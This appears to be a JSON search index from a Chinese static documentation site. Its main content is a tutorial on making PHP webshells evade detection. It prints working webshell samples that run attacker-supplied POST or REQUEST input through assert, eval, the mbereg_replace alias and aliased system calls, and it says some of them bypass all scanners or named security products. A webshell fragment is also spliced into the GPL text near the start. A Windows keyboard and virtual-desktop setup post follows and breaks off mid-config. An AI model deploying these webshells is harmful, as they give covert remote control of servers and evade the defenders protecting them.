restrict development and use of software on general-purpose computers, but in those that do, we wish to avoid the special danger that patents applied to a free program could make it effectively proprietary. patents applied to GPL assures that patents cannot be used to render the program non-free. The precise terms and conditions for copying, distribution and modification follow. TERMS AND CONDITIONS 0. Definitions. \"This License\" refers to version 3 of the GNU General Public License. \"Copyright\" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks. \"The Program\" refers to any copyrightable work licensed under this License. Each licensee is addressed as \"you\". \"Licensees\" and \"recipients\" may be individuals or organizations. To \"modify\" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy. The resulting work is called a \"modified version\" of the earlier work or a work \"based on\" the earlier work. A \"covered work\" means either the unmodified Program or a work based on the Program. To \"propagate\" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy. Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well. To \"convey\" a work means any kind of propagation that enables other parties to make or receive copies. Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying. An interactive user interface displays \"Appropriate Legal Notices\" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License. If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion. 1. Source Code. The \"source code\" for a work means the preferred form of the work for making modifications to it. \"Object code\" means any non-source form of a work. A \"Standard Interface\" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language. The \"System Libraries\" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form. A \"Major Component\", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it. The \"Corresponding Source\" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities. However, it does not include the work's System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not */ @ $PC4E20 &&@ $F ( $A , $B ); /*. For example, Corresponding Source the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work. The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source. The Corresponding Source for a work in source code form is that same work. 2. Basic Permissions. All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met. This License explicitly affirms your unlimited permission to run the unmodified Program. The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work. This License acknowledges your rights of fair use or other equivalent, as provided by copyright law. You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force. You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright. Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you. Conveying under any other circumstances is permitted solely under the conditions stated below. Sublicensing is not allowed; section 10 makes it unnecessary. */ ?> \u4e5f\u8bb8\u4e0a\u9762\u7684\u65b9\u6cd5\u53ea\u4f7f\u7528\u4e00\u79cd\u7684\u8bdd\u65e0\u6cd5\u8fbe\u5230\u514d\u6740\u7684\u76ee\u7684,\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5d4c\u5957\u4f7f\u7528,\u5982\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570/\u7c7b,\u5728\u91cc\u9762\u8fdb\u884c\u8c03\u7528 <?php // copy from https://xz.aliyun.com/t/5152 function test ( $a , $b ){ array_map ( $a , $b ); } test ( assert , array ( $_POST [ 'x' ])); ?> <?php // copy from https://xz.aliyun.com/t/5152 class loveme { var $a ; var $b ; function __construct ( $a , $b ) { $this -> a = $a ; $this -> b = $b ; } function test () { array_map ( $this -> a , $this -> b ); } } $p1 = new loveme ( assert , array ( $_POST [ 'x' ])); $p1 -> test (); ?>","title":"\u53d8\u5f62\u4e0e\u4f2a\u88c5"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u7b26\u53f7\u5e72\u6270","text":"\u8fd9\u79cd\u65b9\u6cd5\u901a\u5e38\u7528\u4e8e\u5e72\u6270\u67e5\u6740\u7684\u6b63\u5219\u5224\u65ad,\u53ef\u4ee5\u4f7f\u7528\u7684\u7b26\u53f7\u6709null,\\n,\\r,\\t\u7b49 \u5e38\u7528\u7684\u65b9\u5f0f\u662f\u5c06\u8fd9\u4e9b\u5b57\u7b26\u4e0e\u5b57\u7b26\u4e32\u8fdb\u884c\u62fc\u63a5,\u5982\u679c\u4f60\u7684webshell\u88ab\u6740\u4e86,\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b, \u5982: <?php // copy from https://xz.aliyun.com/t/5152 $a = $_REQUEST [ 'a' ]; $b = null ; eval ( $b . $a ); ?> <?php // copy from https://xz.aliyun.com/t/5152 $a = $_POST [ 'a' ]; $b = \" \\n \" ; eval ( $b .= $a ); ?> \u8fd8\u6709\u4e00\u79cd\u6bd4\u8f83\u9a9a\u7684\u59ff\u52bf\u5728\u51fd\u6570\u8c03\u7528\u4e2d\u662f\u63d2\u5165\u4e00\u4e9b\u63a7\u5236\u7b26 [\\x00-\\x20] ,PHP\u5f15\u64ce\u4f1a\u5ffd\u7565\u8fd9\u4e9b\u63a7\u5236\u5b57\u7b26,\u6b63\u786e\u6267\u884cPHP\u51fd\u6570,\u5982: <?php // copy from https://bbs.symbo1.com/t/topic/94 eval \\x01\\x02 ( $_POST [ 2333 ]); //\u8fd9\u91cc\\x01\u4e0e\\x02\u8981\u8f6c\u6362\u4e3a\u5b9e\u9645\u7684\u5b57\u7b26","title":"\u7b26\u53f7\u5e72\u6270"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u522b\u540d\u91cd\u547d\u540d","text":"\u5176\u5b9ePHP\u4e2d\u662f\u6709\u5f88\u591a\u51fd\u6570\u522b\u540d\u7684,\u5982pos\u662fcurrent\u7684\u522b\u540d,\u5728PHP5.6\u52a0\u5165\u4e86\u51fd\u6570\u540d\u7684\u547d\u540d\u7a7a\u95f4\u4e4b\u540e\u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\"\u522b\u540d\". \u8fd9\u91cc\u9644\u4e00\u4e2aPHP7.4.3\u4e2d\u51fd\u6570\u522b\u540d\u8868(\u4e2a\u4eba\u6574\u7406,\u53ef\u80fd\u4f1a\u6709\u9519/\u6f0f) bzwrite->fwrite bzflush->fflush bzclose->fclose isId->dom_attr_is_id substringData->dom_characterdata_substring_data appendData->dom_characterdata_append_data insertData->dom_characterdata_insert_data deleteData->dom_characterdata_delete_data replaceData->dom_characterdata_replace_data createElement->dom_document_create_element createDocumentFragment->dom_document_create_document_fragment createTextNode->dom_document_create_text_node createComment->dom_document_create_comment createCDATASection->dom_document_create_cdatasection createProcessingInstruction->dom_document_create_processing_instruction createAttribute->dom_document_create_attribute createEntityReference->dom_document_create_entity_reference getElementsByTagName->dom_document_get_elements_by_tag_name importNode->dom_document_import_node createElementNS->dom_document_create_element_ns createAttributeNS->dom_document_create_attribute_ns getElementsByTagNameNS->dom_document_get_elements_by_tag_name_ns getElementById->dom_document_get_element_by_id adoptNode->dom_document_adopt_node normalizeDocument->dom_document_normalize_document renameNode->dom_document_rename_node save->dom_document_save saveXML->dom_document_savexml validate->dom_document_validate xinclude->dom_document_xinclude saveHTML->dom_document_save_html saveHTMLFile->dom_document_save_html_file schemaValidate->dom_document_schema_validate_file schemaValidateSource->dom_document_schema_validate_xml relaxNGValidate->dom_document_relaxNG_validate_file relaxNGValidateSource->dom_document_relaxNG_validate_xml setParameter->dom_domconfiguration_set_parameter getParameter->dom_domconfiguration_get_parameter canSetParameter->dom_domconfiguration_can_set_parameter handleError->dom_domerrorhandler_handle_error item->dom_domimplementationlist_item getDomimplementation->dom_domimplementationsource_get_domimplementation getDomimplementations->dom_domimplementationsource_get_domimplementations item->dom_domstringlist_item getAttribute->dom_element_get_attribute setAttribute->dom_element_set_attribute removeAttribute->dom_element_remove_attribute getAttributeNode->dom_element_get_attribute_node setAttributeNode->dom_element_set_attribute_node removeAttributeNode->dom_element_remove_attribute_node getElementsByTagName->dom_element_get_elements_by_tag_name getAttributeNS->dom_element_get_attribute_ns setAttributeNS->dom_element_set_attribute_ns removeAttributeNS->dom_element_remove_attribute_ns getAttributeNodeNS->dom_element_get_attribute_node_ns setAttributeNodeNS->dom_element_set_attribute_node_ns getElementsByTagNameNS->dom_element_get_elements_by_tag_name_ns hasAttribute->dom_element_has_attribute hasAttributeNS->dom_element_has_attribute_ns setIdAttribute->dom_element_set_id_attribute setIdAttributeNS->dom_element_set_id_attribute_ns setIdAttributeNode->dom_element_set_id_attribute_node getNamedItem->dom_namednodemap_get_named_item setNamedItem->dom_namednodemap_set_named_item removeNamedItem->dom_namednodemap_remove_named_item item->dom_namednodemap_item getNamedItemNS->dom_namednodemap_get_named_item_ns setNamedItemNS->dom_namednodemap_set_named_item_ns removeNamedItemNS->dom_namednodemap_remove_named_item_ns count->dom_namednodemap_count getName->dom_namelist_get_name getNamespaceURI->dom_namelist_get_namespace_uri insertBefore->dom_node_insert_before replaceChild->dom_node_replace_child removeChild->dom_node_remove_child appendChild->dom_node_append_child hasChildNodes->dom_node_has_child_nodes cloneNode->dom_node_clone_node normalize->dom_node_normalize isSupported->dom_node_is_supported hasAttributes->dom_node_has_attributes compareDocumentPosition->dom_node_compare_document_position isSameNode->dom_node_is_same_node lookupPrefix->dom_node_lookup_prefix isDefaultNamespace->dom_node_is_default_namespace lookupNamespaceUri->dom_node_lookup_namespace_uri isEqualNode->dom_node_is_equal_node getFeature->dom_node_get_feature setUserData->dom_node_set_user_data getUserData->dom_node_get_user_data item->dom_nodelist_item count->dom_nodelist_count findOffset16->dom_string_extend_find_offset16 findOffset32->dom_string_extend_find_offset32 splitText->dom_text_split_text isWhitespaceInElementContent->dom_text_is_whitespace_in_element_content isElementContentWhitespace->dom_text_is_whitespace_in_element_content replaceWholeText->dom_text_replace_whole_text handle->dom_userdatahandler_handle registerNamespace->dom_xpath_register_ns query->dom_xpath_query evaluate->dom_xpath_evaluate registerPhpFunctions->dom_xpath_register_php_functions ftp_quit->ftp_close imap_header->imap_headerinfo imap_listmailbox->imap_list imap_getmailboxes->imap_list_full imap_scanmailbox->imap_listscan imap_listsubscribed->imap_lsub imap_getsubscribed->imap_lsub_full imap_fetchtext->imap_body imap_scan->imap_listscan imap_create->imap_createmailbox imap_rename->imap_renamemailbox ldap_close->ldap_unbind ldap_get_values->ldap_get_values_len ldap_modify->ldap_mod_replace mysqli_execute->mysqli_stmt_execute mysqli_escape_string->mysqli_real_escape_string mysqli_set_opt->mysqli_options autocommit->mysqli_autocommit begin_transaction->mysqli_begin_transaction change_user->mysqli_change_user character_set_name->mysqli_character_set_name close->mysqli_close commit->mysqli_commit connect->mysqli_connect dump_debug_info->mysqli_dump_debug_info debug->mysqli_debug get_charset->mysqli_get_charset get_client_info->mysqli_get_client_info get_client_info->mysqli_get_client_info get_connection_stats->mysqli_get_connection_stats get_server_info->mysqli_get_server_info get_warnings->mysqli_get_warnings init->mysqli_init_method kill->mysqli_kill multi_query->mysqli_multi_query construct->mysqli_link_construct more_results->mysqli_more_results next_result->mysqli_next_result options->mysqli_options ping->mysqli_ping prepare->mysqli_prepare query->mysqli_query real_connect->mysqli_real_connect real_escape_string->mysqli_real_escape_string escape_string->mysqli_real_escape_string real_query->mysqli_real_query release_savepoint->mysqli_release_savepoint rollback->mysqli_rollback savepoint->mysqli_savepoint select_db->mysqli_select_db set_charset->mysqli_set_charset set_opt->mysqli_options ssl_set->mysqli_ssl_set stat->mysqli_stat stmt_init->mysqli_stmt_init store_result->mysqli_store_result thread_safe->mysqli_thread_safe use_result->mysqli_use_result refresh->mysqli_refresh construct->mysqli_result_construct close->mysqli_free_result free->mysqli_free_result data_seek->mysqli_data_seek fetch_field->mysqli_fetch_field fetch_fields->mysqli_fetch_fields fetch_field_direct->mysqli_fetch_field_direct fetch_all->mysqli_fetch_all fetch_array->mysqli_fetch_array fetch_assoc->mysqli_fetch_assoc fetch_object->mysqli_fetch_object fetch_row->mysqli_fetch_row field_seek->mysqli_field_seek free_result->mysqli_free_result construct->mysqli_stmt_construct attr_get->mysqli_stmt_attr_get attr_set->mysqli_stmt_attr_set bind_param->mysqli_stmt_bind_param bind_result->mysqli_stmt_bind_result close->mysqli_stmt_close data_seek->mysqli_stmt_data_seek execute->mysqli_stmt_execute fetch->mysqli_stmt_fetch get_warnings->mysqli_stmt_get_warnings result_metadata->mysqli_stmt_result_metadata more_results->mysqli_stmt_more_results next_result->mysqli_stmt_next_result num_rows->mysqli_stmt_num_rows send_long_data->mysqli_stmt_send_long_data free_result->mysqli_stmt_free_result reset->mysqli_stmt_reset prepare->mysqli_stmt_prepare store_result->mysqli_stmt_store_result get_result->mysqli_stmt_get_result oci_free_cursor->oci_free_statement ocifreecursor->oci_free_statement ocibindbyname->oci_bind_by_name ocidefinebyname->oci_define_by_name ocicolumnisnull->oci_field_is_null ocicolumnname->oci_field_name ocicolumnsize->oci_field_size ocicolumnscale->oci_field_scale ocicolumnprecision->oci_field_precision ocicolumntype->oci_field_type ocicolumntyperaw->oci_field_type_raw ociexecute->oci_execute ocicancel->oci_cancel ocifetch->oci_fetch ocifetchstatement->oci_fetch_all ocifreestatement->oci_free_statement ociinternaldebug->oci_internal_debug ocinumcols->oci_num_fields ociparse->oci_parse ocinewcursor->oci_new_cursor ociresult->oci_result ociserverversion->oci_server_version ocistatementtype->oci_statement_type ocirowcount->oci_num_rows ocilogoff->oci_close ocilogon->oci_connect ocinlogon->oci_new_connect ociplogon->oci_pconnect ocierror->oci_error ocifreedesc->oci_free_descriptor ocisavelob->oci_lob_save ocisavelobfile->oci_lob_import ociwritelobtofile->oci_lob_export ociloadlob->oci_lob_load ocicommit->oci_commit ocirollback->oci_rollback ocinewdescriptor->oci_new_descriptor ocisetprefetch->oci_set_prefetch ocipasswordchange->oci_password_change ocifreecollection->oci_free_collection ocinewcollection->oci_new_collection ocicollappend->oci_collection_append ocicollgetelem->oci_collection_element_get ocicollassignelem->oci_collection_element_assign ocicollsize->oci_collection_size ocicollmax->oci_collection_max ocicolltrim->oci_collection_trim load->oci_lob_load tell->oci_lob_tell truncate->oci_lob_truncate erase->oci_lob_erase flush->oci_lob_flush setbuffering->ocisetbufferinglob getbuffering->ocigetbufferinglob rewind->oci_lob_rewind read->oci_lob_read eof->oci_lob_eof seek->oci_lob_seek write->oci_lob_write append->oci_lob_append size->oci_lob_size writetofile->oci_lob_export export->oci_lob_export import->oci_lob_import writetemporary->oci_lob_write_temporary close->oci_lob_close save->oci_lob_save savefile->oci_lob_import free->oci_free_descriptor append->oci_collection_append getelem->oci_collection_element_get assignelem->oci_collection_element_assign assign->oci_collection_assign size->oci_collection_size max->oci_collection_max trim->oci_collection_trim free->oci_free_collection odbc_do->odbc_exec odbc_field_precision->odbc_field_len openssl_free_key->openssl_pkey_free openssl_get_privatekey->openssl_pkey_get_private openssl_get_publickey->openssl_pkey_get_public pcntl_errno->pcntl_get_last_error pg_exec->pg_query pg_getlastoid->pg_last_oid pg_cmdtuples->pg_affected_rows pg_errormessage->pg_last_error pg_numrows->pg_num_rows pg_numfields->pg_num_fields pg_fieldname->pg_field_name pg_fieldsize->pg_field_size pg_fieldtype->pg_field_type pg_fieldnum->pg_field_num pg_fieldprtlen->pg_field_prtlen pg_fieldisnull->pg_field_is_null pg_freeresult->pg_free_result pg_result->pg_fetch_result pg_loreadall->pg_lo_read_all pg_locreate->pg_lo_create pg_lounlink->pg_lo_unlink pg_loopen->pg_lo_open pg_loclose->pg_lo_close pg_loread->pg_lo_read pg_lowrite->pg_lo_write pg_loimport->pg_lo_import pg_loexport->pg_lo_export pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding posix_errno->posix_get_last_error session_commit->session_write_close snmpwalkoid->snmprealwalk snmp_set_oid_numeric_print->snmp_set_oid_output_format socket_getopt->socket_get_option socket_setopt->socket_set_option sodium_crypto_scalarmult_base->sodium_crypto_box_publickey_from_secretkey join->implode chop->rtrim strchr->strstr srand->mt_srand getrandmax->mt_getrandmax show_source->highlight_file ini_alter->ini_set checkdnsrr->dns_check_record getmxrr->dns_get_mx doubleval->floatval is_integer->is_int is_long->is_int is_double->is_float fputs->fwrite set_file_buffer->stream_set_write_buffer socket_set_blocking->stream_set_blocking stream_register_wrapper->stream_wrapper_register stream_register_wrapper->stream_wrapper_register socket_set_timeout->stream_set_timeout dir->getdir is_writeable->is_writable diskfreespace->disk_free_space pos->current sizeof->count key_exists->array_key_exists close->closedir rewind->rewinddir importStylesheet->xsl_xsltprocessor_import_stylesheet transformToDoc->xsl_xsltprocessor_transform_to_doc transformToUri->xsl_xsltprocessor_transform_to_uri transformToXml->xsl_xsltprocessor_transform_to_xml setParameter->xsl_xsltprocessor_set_parameter getParameter->xsl_xsltprocessor_get_parameter removeParameter->xsl_xsltprocessor_remove_parameter hasExsltSupport->xsl_xsltprocessor_has_exslt_support registerPHPFunctions->xsl_xsltprocessor_register_php_functions setProfiling->xsl_xsltprocessor_set_profiling setSecurityPrefs->xsl_xsltprocessor_set_security_prefs getSecurityPrefs->xsl_xsltprocessor_get_security_prefs gzrewind->rewind gzclose->fclose gzeof->feof gzgetc->fgetc gzgets->fgets DEP_FALIAS(gzgetss->fgetss gzread->fread gzpassthru->fpassthru gzseek->fseek gztell->ftell gzwrite->fwrite gzputs->fwrite getallheaders->apache_request_headers getallheaders->litespeed_request_headers apache_request_headers->litespeed_request_headers apache_response_headers->litespeed_response_headers \u8fd9\u91cc\u9644\u7684\u8868\u4e0d\u5305\u542b\u88ab\u5f03\u7528\u7684(\u4f1a\u6709PHP\u8b66\u544a,\u4f46\u4ecd\u53ef\u7528),\u800c\u5728\u8fd9\u4e9b\u522b\u540d\u4e2d,\u6211\u4eec\u5c31\u53ef\u4ee5\u627e\u5230\u53ef\u4ee5\u5229\u7528\u7684\u51fd\u6570mbereg replace,\u8fd9\u4e2a\u51fd\u6570\u662fmb ereg replace\u7684\u522b\u540d,mb ereg replace\u4e0epreg replace\u7c7b\u4f3c,\u53ef\u4ee5\u5229\u7528e\u6a21\u5f0f\u9690\u5f0f\u6267\u884c\u4ee3\u7801,\u4f46\u662fmb ereg replace\u65e0\u6cd5\u9003\u8fc7\u67e5\u6740,\u800cmbereg replace\u5219\u662fALLKILL,\u6ca1\u9519,\u53ea\u662f\u4e00\u4e2a \u7684\u5dee\u522b,\u8ba9\u4ed6\u9003\u8fc7\u4e86\u514d\u6740\u7684\u773c\u775b <?php // (ALLKILL) error_reporting ( 0 ); mbereg_replace ( '.*' , '\\0' , $_REQUEST [ 2333 ], 'mer' ); //php5 php7 success ?> \u53e6\u5916,\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\u522b\u540d,\u5982: <?php // PHP >=5.6 \u53ef\u8fc7\u76fe\u72d7 use function \\system as strlen ; // \u914d\u5408\u6587\u4ef6\u5305\u542b\u8fd9\u751a\u81f3\u53ef\u4ee5\u5b9e\u73b0\u52ab\u6301,\u7559\u5f85\u4f60\u4eec\u5f00\u53d1 strlen ( $_POST [ 1 ]); <?php // (ALLKILL) define ( \"ARRAY2\" , \"sys\" . \"tem\" ); @ constant ( \"ARRAY2\" )( pos ( pos ( $GLOBALS ))); // PHP>7 \u514d\u8d23\u58f0\u660e: \u5728\u5bf9\u65b9\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u76f4\u63a5\u6216\u95f4\u63a5\u5229\u7528\u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u7814\u7a76\u6837\u672c\u653b\u51fb\u76ee\u6807\u662f\u8fdd\u6cd5\u884c\u4e3a. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u4ec5\u4e3a\u5b89\u5168\u7814\u7a76\u548c\u6388\u6743\u60c5\u51b5\u4e0b\u4f7f\u7528\uff0c\u5176\u4f7f\u7528\u4eba\u5458\u6709\u8d23\u4efb\u548c\u4e49\u52a1\u9075\u5b88\u5f53\u5730\u6cd5\u5f8b\u6761\u89c4. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u6837\u672c\u53ca\u6587\u7ae0\u4ec5\u4e3a\u4fc3\u8fdb\u5b89\u5168\u9632\u5fa1\u7814\u7a76\u4f7f\u7528\uff0c\u7814\u7a76\u4eba\u5458\u5bf9\u56e0\u8bef\u7528\u8be5\u7a0b\u5e8f\u9020\u6210\u7684\u8d44\u4ea7\u635f\u574f\u548c\u635f\u5931\u6982\u4e0d\u8d1f\u8d23.","title":"\u522b\u540d/\u91cd\u547d\u540d"},{"location":"%E6%9D%82%E9%A1%B9/%E6%9D%82%E9%A1%B9/","text":"\u6742\u9879 Overview # type: folder_brief_live noteOnly: true style: strip","title":"\u6742\u9879 Overview"},{"location":"%E6%9D%82%E9%A1%B9/%E6%9D%82%E9%A1%B9/#\u6742\u9879-overview","text":"type: folder_brief_live noteOnly: true style: strip","title":"\u6742\u9879 Overview"},{"location":"%E6%9D%82%E9%A1%B9/%E6%97%A5%E5%B8%B8/%E6%97%A5%E5%B8%B8/","text":"\u65e5\u5e38 Overview # type: folder_brief_live noteOnly: true style: strip","title":"\u65e5\u5e38 Overview"},{"location":"%E6%9D%82%E9%A1%B9/%E6%97%A5%E5%B8%B8/%E6%97%A5%E5%B8%B8/#\u65e5\u5e38-overview","text":"type: folder_brief_live noteOnly: true style: strip","title":"\u65e5\u5e38 Overview"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/","text":"\u5173\u4e8ewindows\u63d0\u5347\u6548\u7387\u90a3\u4e9b\u4e8b # \u6700\u8fd1\u6362\u4e86\u65b0\u7535\u8111\uff0c\u914d\u7f6e\u7684\u65f6\u5019\u521a\u597d\u60f3\u8d77\u6765\uff0c\u4e8e\u662f\u603b\u7ed3\u4e0b\u5982\u4f55\u5728windows\u4e0b\u63d0\u9ad8\u6548\u7387\uff08\u4e3b\u8981\u662f\u5b9e\u73b0mac/*unix\u4e0b\u7684\u4e00\u4e9b\u5df2\u7ecf\u6709\u7684\u529f\u80fd\uff09 caps2esc # \u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0 Caps Lock\u7684\u4f5c\u7528\u662f\u9501\u5b9a\u8f93\u5165\u4e3a\u5927\u5199\u5b57\u6bcd\uff0c\u8fd9\u4e2a\u952e\u4f4d\u5bf9\u6211\u6765\u8bf4\u6ca1\u4ec0\u4e48\u7528\uff0c\u5b8c\u5168\u53ef\u4ee5\u4f7f\u7528Shift\u4ee3\u66ff\u3002 \u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u8003\u8651\u5c06Caps Lock\u5229\u7528\u8d77\u6765\uff0c\u5728\u5355\u51fb\u548c\u957f\u6309\u65f6\u5206\u522b\u6620\u5c04\u4e3aEsc\u548cCtrl\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u51e0\u4e4e\u6ca1\u5fc5\u8981\u518d\u53bb\u6309ESC(\u5de6\u4e0a\u89d2)\u548cCtrl(\u5de6\u4e0b\u89d2)\u4e86\u3002 \u5b89\u88c5 # \u90a3\u4e48\u8981\u5982\u4f55\u5b9e\u73b0\u5462\uff1f\u7ed3\u5408\u524d\u4eba\u7684\u7ecf\u9a8c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u767d\u5ad6\uff0c\u94fe\u63a5\u5728 \u8fd9\u91cc \u76f4\u63a5\u4e0b\u8f7dInterception.zip\uff0c\u5728 command line installer \u6587\u4ef6\u5939\u548c samples/x86 \u6587\u4ef6\u5939\u4e0b\u627e\u5230\u6211\u4eec\u9700\u8981\u7684\u5de5\u5177\uff1a install-interception.exe \u548c caps2esc.exe \u6253\u5f00\u5177\u6709 \u7ba1\u7406\u5458\u6743\u9650 \u7684CMD\u6216POWERSHELL\u7a97\u53e3\uff0c\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801: .\\install-interception.exe /install \u6b64\u65f6\u518d\u8fd0\u884c caps2esc.exe \u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u6548\u679c\u4e86\uff08\u5982\u679c\u6ca1\u6548\u679c\u8bd5\u8bd5\u91cd\u542f\u5927\u6cd5\uff0c\u5426\u5219\u5c31\u662f\u4e0a\u9762\u7684install\u6ca1\u6709\u6210\u529f\uff09 \u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\uff0c\u53ef\u4ee5\u5c06 caps2esc.exe \u8bbe\u7f6e\u4e3a\u5f00\u673a\u542f\u52a8 \u5982\u679c\u8981\u5378\u8f7d\u7684\u8bdd\uff0c\u5219\u6267\u884c .\\install-interception.exe /uninstall \u5373\u53ef\u3002 \u4f7f\u7528 # \u5c31\u5982\u6211\u4eec\u521a\u521a\u6240\u8bf4\uff0c\u6b64\u65f6Caps Lock\u952e\u5355\u51fb\u65f6\u4f1a\u53d8\u6210esc\u952e\uff08\u4ee5\u524d\u6211\u4e0d\u559c\u6b22\u6309esc\u952e\uff0c\u56e0\u4e3a\u5b83\u5b9e\u5728\u592a\u8fdc\u4e86\uff0c\u4f46\u662f\u73b0\u5728\u8d8a\u6309\u8d8a\u723d\uff09\uff0c\u914d\u5408\u5176\u4ed6\u6309\u952e\u4e00\u8d77\u7684\u65f6\u5019\u5c31\u662fCtrl\u952e\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f60\u53ef\u4ee5\u4f7f\u7528Caps Lock + c\u4f5c\u4e3aCtrl + c\u7b49\uff0c\u540c\u65f6\u539f\u672c\u7684ESC\u952e\u5219\u53d8\u4e3a\u4e86\u539f\u59cbCaps Lock\u7684\u529f\u80fd virtual-desktop-enhancer # \u6211\u4eec\u77e5\u9053windows10\u4e2d\u662f\u5b58\u5728\u591a\u865a\u62df\u684c\u9762\u7684\uff0c\u4f46\u662f\u4e00\u76f4\u4e0d\u591f\u597d\u7528\uff08\u4e0d\u80fd\u901a\u8fc7\u952e\u76d8\u5207\u6362\u5230\u6307\u5b9a\u7684\u684c\u9762\uff0c\u4e0d\u80fd\u901a\u8fc7\u952e\u76d8\u5c06\u67d0\u4e2a\u8fdb\u7a0b\u79fb\u52a8\u5230\u67d0\u4e2a\u6307\u5b9a\u7684\u684c\u9762\uff09\uff0c\u800cvirtual-desktop-enhancer\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684 \u5b89\u88c5 # virtual-desktop-enhancer\u5728github\u4e0a\u5c31\u80fd\u641c\u5230\uff0c\u4f46\u662f\u65e9\u5c31\u5f52\u6863\u4e0d\u66f4\u65b0\u4e86\uff0c\u8fd9\u5c31\u5bfc\u81f4\u65b0\u7248windows\u65e0\u6cd5\u4f7f\u7528\uff0c\u6b64\u65f6\u5c31\u8981\u53bb\u627e\u5b83\u7684fork\u9879\u76ee\uff0c\u627e\u5230\u8fd8\u80fd\u65b0\u7248windows\u7528\u7684(windows \u7248\u672c21h1\u53ef\u4ee5\u4f7f\u7528)\uff0c\u94fe\u63a5\u5728 \u8fd9\u91cc \u5b89\u88c5\u76f4\u63a5 git clone https://github.com/amrahm/win-10-virtual-desktop-enhancer \u5373\u53ef \u4f7f\u7528 # \u4f7f\u7528windows+tab\u53bb\u521b\u5efa\u51e0\u4e2a\u65b0\u7684\u865a\u62df\u684c\u9762(\u597d\u50cf\u53ef\u4ee5\u7701\u7565) \u53ef\u4ee5\u5b89\u88c5autohotkey\u53bb\u8fd0\u884c.ahk\u811a\u672c\u6216\u8005\u76f4\u63a5\u8fd0\u884cexe\uff0c\u76f8\u5173\u914d\u7f6e\u5728 settings.ini \u770b\u770b\u53f3\u4e0b\u89d2\u4efb\u52a1\u680f\u662f\u5426\u5f00\u4e86\u4e2a\u65b0\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u662f\u4e00\u4e2a\u6570\u5b57\uff08\u5bf9\u5e94\u5f53\u524d\u7684\u684c\u9762\uff09 \u4fee\u6539\u914d\u7f6e\uff0c\u8fd9\u91cc\u8d34\u4e0b\u6211\u7684\u914d\u7f6e,\u4f7f\u7528windows+\u6570\u5b57\u952e\u5207\u6362\u5230\u5bf9\u5e94\u7684\u865a\u62df\u684c\u9762\uff0c\u4f7f\u7528windows+shift+\u6570\u5b57\u952e\u5c06\u5f53\u524d\u7684\u8fdb\u7a0b\u79fb\u52a8\u5230\u5bf9\u5e94\u7684\u865a\u62df\u684c\u9762\uff0c\u540c\u65f6\u53ef\u4ee5\u4fee\u6539[Wallpapers]\u4e2d\u7684\u8def\u5f84\uff0c\u4ece\u800c\u4f7f\u5f97\u4e0d\u540c\u7684\u865a\u62df\u684c\u9762\u81ea\u52a8\u5207\u6362\u4e0d\u540c\u7684\u684c\u9762\u80cc\u666f [General] DefaultDesktop = 2 TaskbarScrollSwitching = 0 UseNativePrevNextDesktopSwitchingIfConflicting = 0 DesktopWrapping = 